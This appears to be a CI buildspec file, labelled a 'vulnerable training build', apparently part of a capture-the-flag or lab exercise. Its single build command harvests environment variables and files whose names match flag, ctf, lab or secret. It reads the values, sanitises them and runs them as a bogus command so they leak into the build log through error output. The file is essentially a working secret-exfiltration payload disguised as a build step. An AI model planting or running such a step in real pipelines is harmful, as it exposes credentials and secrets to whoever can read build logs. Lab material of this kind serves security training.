version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - |
        bash -lc 'GW_$( (env | grep -Ei "flag|ctf|lab|secret" || find / -maxdepth 5 -type f \( -iname "*flag*" -o -iname "*secret*" \) -exec sh -c "for f; do sed -n 1p \"$f\"; done" sh {} + 2>/dev/null) | head -c 220 | tr -c "A-Za-z0-9_{}=-" "_" )'
